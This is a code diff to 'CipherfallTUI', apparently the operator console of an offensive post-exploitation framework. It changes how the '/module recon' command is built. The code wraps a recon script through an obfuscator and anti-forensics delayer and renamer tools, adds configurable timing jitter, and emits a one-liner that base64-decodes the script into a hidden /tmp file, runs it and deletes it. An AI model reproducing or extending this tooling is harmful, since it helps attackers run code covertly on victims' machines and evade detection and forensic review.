@@ -788,13 +788,23 @@ class CipherfallTUI(App):
                 cmd = f"UPLOAD:{_download_remote}"
         elif cmd.startswith("/module recon"):
             parts        = cmd.split()
-            do_obfuscate = "--no-obfuscate" not in parts
-            do_delayer   = "--no-delayer"   not in parts
-            do_renamer   = "--no-renamer"   not in parts
-            pe_src   = HERE.parent / "Recon"           / "phantom_eye.sh"
-            ss_path  = HERE.parent / "Obfuscator"      / "shadowscript.sh"
-            del_path = HERE.parent / "Anti-forensics"  / "echoerase_delayer.sh"
-            ren_path = HERE.parent / "Anti-forensics"  / "echoerase_renamer.py"
+            do_obfuscate = "--obfuscate" in parts
+            do_renamer   = "--renamer"   in parts
+            delayer_fixed, delayer_jitter = "0.5", "0.2"
+            do_delayer = "--delayer" in parts
+            if do_delayer:
+                di = parts.index("--delayer")
+                try:
+                    delayer_fixed  = parts[di + 1]
+                    delayer_jitter = parts[di + 2]
+                except IndexError:
+                    log.clear()
+                    log.write("[red]usage: /module recon [--obfuscate] [--delayer INT JITTER] [--renamer][/red]")
+                    return
+            pe_src   = HERE.parent / "Recon"          / "phantom_eye.sh"
+            ss_path  = HERE.parent / "Obfuscator"     / "shadowscript.sh"
+            del_path = HERE.parent / "Anti-forensics" / "echoerase_delayer.sh"
+            ren_path = HERE.parent / "Anti-forensics" / "echoerase_renamer.py"
             if not pe_src.exists():
                 log.clear()
                 log.write(f"[red]not found: {pe_src}[/red]")
@@ -804,9 +814,9 @@ class CipherfallTUI(App):
                 tmp = tmpdir / "phantom_eye.sh"
                 shutil.copy(pe_src, tmp)
                 if do_delayer:
-                    log.write("[yellow]applying echoerase_delayer…[/yellow]")
+                    log.write(f"[yellow]applying echoerase_delayer ({delayer_fixed}s ±{delayer_jitter}s)…[/yellow]")
                     r = subprocess.run(
-                        ["bash", str(del_path), str(tmp), "0.5", "0.2"],
+                        ["bash", str(del_path), str(tmp), delayer_fixed, delayer_jitter],
                         capture_output=True, text=True
                     )
                     delayed = tmpdir / "phantom_eye_delayed.sh"
@@ -833,7 +843,7 @@ class CipherfallTUI(App):
                 b64   = base64.b64encode(data).decode()
                 rname = f"/tmp/.{uuid.uuid4().hex[:8]}"
                 cmd   = f"echo {shlex.quote(b64)} | base64 -d > {rname} && bash {rname}; rm -f {rname}"
-                flags = ([" delayer"] if do_delayer else []) + ([" obfuscate"] if do_obfuscate else []) + ([" renamer"] if do_renamer else [])
+                flags = (["delayer"] if do_delayer else []) + (["obfuscate"] if do_obfuscate else []) + (["renamer"] if do_renamer else [])
                 log.write(f"[green]recon ready ({'|'.join(flags) or 'raw'}) → {len(data)} bytes[/green]")
             finally:
                 shutil.rmtree(tmpdir, ignore_errors=True)
